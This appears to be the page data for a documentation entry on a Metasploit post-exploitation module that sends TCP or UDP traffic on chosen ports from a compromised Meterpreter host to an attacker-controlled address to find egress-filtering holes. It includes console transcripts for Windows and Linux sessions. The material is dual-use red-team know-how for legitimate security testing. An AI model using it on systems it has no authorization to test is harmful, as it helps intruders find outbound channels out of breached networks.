{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/multi/recon/multiport_egress_traffic","result":{"data":{"moduleMetadataJson":{"id":"eee0b2f9-482d-50d3-af5d-ab3b1d7acb46","name":"Generate TCP/UDP Outbound Traffic On Multiple Ports","fullname":"post/multi/recon/multiport_egress_traffic","description":"This module generates TCP or UDP traffic across a\n        sequence of ports, and is useful for finding firewall\n        holes and egress filtering. It only generates traffic\n        on the port range you specify. It is up to you to\n        run a responder or packet capture tool on a remote\n        endpoint to determine which ports are open.","rank":300,"fields":{"detailsSlug":"/modules/details/post/multi/recon/multiport_egress_traffic","documentationSlug":"/modules/documentation/post/multi/recon/multiport_egress_traffic","referencesSlug":"/modules/references/post/multi/recon/multiport_egress_traffic"},"documentation":{"html":"<p>This is a Meterpreter post exploitation module that will generate TCP and UDP packets on a range of ports and send them to a provided IP address. The primary purpose of this is for 'egress busting' and provides a rapid method of generating legitimate TCP or UDP traffic on each port. This is useful for red-teaming type exercises in which you have meterpreter running on a host but wish to determine additional ports over which egress traffic is permitted.</p>\n<p>It can generate the packets in two different ways; it can call the Windows sockets API (using railgun for Windows clients) or it can create the packets using Rex.</p>\n<p>NATIVE mode uses Rex sockets to generate traffic.\nWINAPI mode uses Winsock APIs to generate traffic.</p>\n<p>As it currently stands, the user will need to set up a listener/tcpdump/wireshark to determine the ports that are open. My <a href=\"https://github.com/stufus/egresscheck-framework\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">egresscheck-framework</a> code can help with that, but any listener would be fine.</p>\n<h1 id=\"example---windows-meterpreter\" style=\"position:relative;\"><a href=\"#example---windows-meterpreter\" aria-label=\"example   windows meterpreter permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example - Windows Meterpreter</h1>\n<p>Scenario is:</p>\n<ul>\n<li>The victim host is 192.0.2.104</li>\n<li>The attacker is 192.0.2.1</li>\n<li>The attacker wishes to generate TCP packets to 192.0.2.1 (with meterpreter on 192.0.2.104) on ports 22,23,53,80,88,443 and 445 to see if any of the packets reach 192.0.2.1. Note that the attacker has control of 192.0.2.1.</li>\n<li>The compromised machine is a Windows 8.1 machine</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf&gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Type                   Information             Connection\n  --  ----                   -----------             ----------\n  2   meterpreter x86/win32  TESTER\\Stuart @ TESTER  192.0.2.1:9877 -&gt; 192.0.2.104:43595 (192.0.2.104)\n\nmsf&gt; set METHOD NATIVE\nMETHOD =&gt; NATIVE\nmsf&gt; set PORTS 22,23,53,80,88,443,445\nPORTS =&gt; 22,23,53,80,88,443,445\nmsf&gt; set PROTOCOL TCP\nPROTOCOL =&gt; TCP\nmsf&gt; set SESSION 2\nSESSION =&gt; 2\nmsf&gt; set TARGET 192.0.2.1\nTARGET =&gt; 192.0.2.1\nmsf&gt; set THREADS 3\nTHREADS =&gt; 3\nmsf&gt; show options\n\nModule options (post/multi/manage/multiport_egress_traffic):\n\n   Name      Current Setting         Required  Description\n   ----      ---------------         --------  -----------\n   METHOD    NATIVE                  yes       The mechanism by which the packets are generated. Can be NATIVE or WINAPI (Windows only). (Accepted: NATIVE, WINAPI)\n   PORTS     22,23,53,80,88,443,445  yes       Ports to test.\n   PROTOCOL  TCP                     yes       Protocol to use. (Accepted: TCP, UDP)\n   SESSION   2                       yes       The session to run this module on.\n   TARGET    192.0.2.1               yes       Destination IP address.\n   THREADS   3                       yes       Number of simultaneous threads/connections to try.\n\nmsf&gt; run\n[*] Generating TCP traffic to 192.0.2.1...\n[*] TCP traffic generation to 192.0.2.1 completed.\n[*] Post module execution completed\nmsf&gt; set VERBOSE TRUE\nVERBOSE =&gt; TRUE\nmsf&gt; run\n[*] Number of threads: 3.\n[*] Generating TCP traffic to 192.0.2.1...\n[*] [1:NATIVE] Connecting to 192.0.2.1 port TCP/23\n[*] [2:NATIVE] Connecting to 192.0.2.1 port TCP/53\n[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/22\n[*] [2:NATIVE] Error connecting to 192.0.2.1 TCP/53\n[*] [1:NATIVE] Error connecting to 192.0.2.1 TCP/23\n[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/22\n[*] [1:NATIVE] Connecting to 192.0.2.1 port TCP/88\n[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/80\n[*] [2:NATIVE] Connecting to 192.0.2.1 port TCP/443\n[*] [1:NATIVE] Error connecting to 192.0.2.1 TCP/88\n[*] [2:NATIVE] Error connecting to 192.0.2.1 TCP/443\n[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/80\n[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/445\n[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/445\n[*] TCP traffic generation to 192.0.2.1 completed.\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Here is an example with the METHOD parameter set to WINAPI:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf&gt; set METHOD WINAPI\nMETHOD =&gt; WINAPI\nmsf&gt; run\n\n[*] Number of threads: 3.\n[*] Generating TCP traffic to 192.0.2.1...\n[*] [2:WINAPI] Set up socket for 192.0.2.1 port TCP/53 (Handle: 14908)\n[*] [1:WINAPI] Set up socket for 192.0.2.1 port TCP/23 (Handle: 14856)\n[*] [2:WINAPI] Connecting to 192.0.2.1:TCP/53\n[*] [1:WINAPI] Connecting to 192.0.2.1:TCP/23\n[*] [0:WINAPI] Set up socket for 192.0.2.1 port TCP/22 (Handle: 14300)\n[*] [0:WINAPI] Connecting to 192.0.2.1:TCP/22\n[*] [2:WINAPI] There was an error sending a connect packet for TCP socket (port 53) Error: 10061\n[*] [0:WINAPI] There was an error sending a connect packet for TCP socket (port 22) Error: 10061\n[*] [1:WINAPI] There was an error sending a connect packet for TCP socket (port 23) Error: 10061\n[*] [1:WINAPI] Set up socket for 192.0.2.1 port TCP/88 (Handle: 13868)\n[*] [0:WINAPI] Set up socket for 192.0.2.1 port TCP/80 (Handle: 14300)\n[*] [1:WINAPI] Connecting to 192.0.2.1:TCP/88\n[*] [2:WINAPI] Set up socket for 192.0.2.1 port TCP/443 (Handle: 14908)\n[*] [0:WINAPI] Connecting to 192.0.2.1:TCP/80\n[*] [2:WINAPI] Connecting to 192.0.2.1:TCP/443\n[*] [1:WINAPI] There was an error sending a connect packet for TCP socket (port 88) Error: 10061\n[*] [2:WINAPI] There was an error sending a connect packet for TCP socket (port 443) Error: 10061\n[*] [0:WINAPI] There was an error sending a connect packet for TCP socket (port 80) Error: 10061\n[*] [0:WINAPI] Set up socket for 192.0.2.1 port TCP/445 (Handle: 13868)\n[*] [0:WINAPI] Connecting to 192.0.2.1:TCP/445\n[*] [0:WINAPI] There was an error sending a connect packet for TCP socket (port 445) Error: 10061\n[*] TCP traffic generation to 192.0.2.1 completed.\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>UDP also works correctly:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf&gt; set PROTOCOL UDP\nPROTOCOL =&gt; UDP\nmsf&gt; set METHOD NATIVE\nMETHOD =&gt; NATIVE\nmsf&gt; show options\n\nModule options (post/multi/manage/multiport_egress_traffic):\n\n   Name      Current Setting         Required  Description\n   ----      ---------------         --------  -----------\n   METHOD    NATIVE                  yes       The mechanism by which the packets are generated. Can be NATIVE or WINAPI (Windows only). (Accepted: NATIVE, WINAPI)\n   PORTS     22,23,53,80,88,443,445  yes       Ports to test.\n   PROTOCOL  UDP                     yes       Protocol to use. (Accepted: TCP, UDP)\n   SESSION   2                       yes       The session to run this module on.\n   TARGET    192.0.2.1               yes       Destination IP address.\n   THREADS   3                       yes       Number of simultaneous threads/connections to try.\n\nmsf&gt; run\n\n[*] Number of threads: 3.\n[*] Generating UDP traffic to 192.0.2.1...\n[*] [1:NATIVE] Connecting to 192.0.2.1 port UDP/23\n[*] [2:NATIVE] Connecting to 192.0.2.1 port UDP/53\n[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/22\n[*] [2:NATIVE] Connecting to 192.0.2.1 port UDP/443\n[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/80\n[*] [1:NATIVE] Connecting to 192.0.2.1 port UDP/88\n[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/445\n[*] UDP traffic generation to 192.0.2.1 completed.\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Note that the errors showing in verbose mode are normal; this is because there is nothing actually listening on any of those ports, meaning that the calls will fail.</p>\n<p>Running tcpdump on 192.0.2.1 showed all the connection attempts as normal.</p>\n<h1 id=\"example---linux-meterpreter\" style=\"position:relative;\"><a href=\"#example---linux-meterpreter\" aria-label=\"example   linux meterpreter permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example - Linux Meterpreter</h1>\n<p>Scenario is:</p>\n<ul>\n<li>The victim host is 192.0.2.103</li>\n<li>The attacker is 192.0.2.1</li>\n<li>The attacker wishes to generate TCP packets to 192.0.2.1 (with linux meterpreter on 192.0.2.103) on ports 22,23,53,80,88,443 and 445 to see if any of the packets reach 192.0.2.1. Note that the attacker has control of 192.0.2.1.</li>\n<li>The compromised machine is a Linux machine (running Kali)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf&gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Type                       Information             Connection\n  --  ----                       -----------             ----------\n  4   meterpreter x86/linux      uid=1000, gid=1001, euid=1000, egid=1001, suid=1000, sgid=1001 @ kali  192.0.2.1:4322 -&gt; 192.0.2.103:37489 (192.0.2.103)\n\nmsf&gt; run\n[*] Number of threads: 3.\n[*] Generating TCP traffic to 192.0.2.1...\n[*] [1:NATIVE] Connecting to 192.0.2.1 port TCP/23\n[*] [2:NATIVE] Connecting to 192.0.2.1 port TCP/53\n[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/22\n[*] [1:NATIVE] Error connecting to 192.0.2.1 TCP/23\n[*] [1:NATIVE] Connecting to 192.0.2.1 port TCP/88\n[*] [2:NATIVE] Error connecting to 192.0.2.1 TCP/53\n[*] [2:NATIVE] Connecting to 192.0.2.1 port TCP/443\n[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/22\n[*] [1:NATIVE] Error connecting to 192.0.2.1 TCP/88\n[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/80\n[*] [2:NATIVE] Error connecting to 192.0.2.1 TCP/443\n[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/80\n[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/445\n[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/445\n[*] TCP traffic generation to 192.0.2.1 completed.\n[*] Post module execution completed\nmsf&gt; set PROTOCOL UDP\nPROTOCOL =&gt; UDP\nmsf&gt; run\n[*] Number of threads: 3.\n[*] Generating UDP traffic to 192.0.2.1...\n[*] [1:NATIVE] Connecting to 192.0.2.1 port UDP/23\n[*] [2:NATIVE] Connecting to 192.0.2.1 port UDP/53\n[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/22\n[*] [2:NATIVE] Connecting to 192.0.2.1 port UDP/443\n[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/80\n[*] [1:NATIVE] Connecting to 192.0.2.1 port UDP/88\n[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/445\n[*] UDP traffic generation to 192.0.2.1 completed.\n[*] Post module execution completed\nmsf&gt; show options\n\nModule options (post/multi/manage/multiport_egress_traffic):\n\n   Name      Current Setting         Required  Description\n   ----      ---------------         --------  -----------\n   METHOD    NATIVE                  yes       The mechanism by which the packets are generated. Can be NATIVE or WINAPI (Windows only). (Accepted: NATIVE, WINAPI)\n   PORTS     22,23,53,80,88,443,445  yes       Ports to test.\n   PROTOCOL  UDP                     yes       Protocol to use. (Accepted: TCP, UDP)\n   SESSION   4                       yes       The session to run this module on.\n   TARGET    192.0.2.1               yes       Destination IP address.\n   THREADS   3                       yes       Number of simultaneous threads/connections to try.\n\nmsf&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><img src=\"https://cloud.githubusercontent.com/assets/12296344/11459958/a7862f22-96da-11e5-86a2-31a4c0153944.png\" alt=\"msfegress_tcpdump_udp\"></p>\n<h1 id=\"future-work\" style=\"position:relative;\"><a href=\"#future-work\" aria-label=\"future work permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Future Work</h1>\n<p>This module did not appear to work on python meterpreter.</p>"}}},"pageContext":{"id":"eee0b2f9-482d-50d3-af5d-ab3b1d7acb46"}}}